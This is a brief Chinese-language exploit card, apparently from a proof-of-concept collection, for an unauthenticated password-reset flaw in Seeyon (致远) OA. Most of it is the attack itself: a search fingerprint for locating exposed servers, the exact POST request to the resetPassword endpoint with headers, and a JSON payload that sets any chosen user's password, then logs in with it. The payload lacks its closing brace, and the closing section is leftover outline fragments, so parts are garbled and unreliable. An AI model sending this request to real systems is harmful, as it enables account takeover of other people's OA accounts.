# 致远OA前台任意用户密码修改漏洞

- **系统**：致远OA　|　**类型**：其他　|　**CVE**：—
- **指纹**：`app.name="致远 OA"`
- **请求**：`POST /seeyon/rest/phoneLogin/phoneCode/resetPassword HTTP/1.1`
- **关键头**：`Host: 192.168.31.163:81`　`Cookie: JSESSIONID=481F3949B045D38D5B7507C6CEA92FDB; loginPageURL=`　`Content-Type: application/json`　`Content-Length: 45`

**请求体 / payload**
```
{"loginName":"test","password":"Stc456789"

使用修改的账号密码登录\
```

**其他**
- 致远OA 前台任意用户密码修改漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 致远OA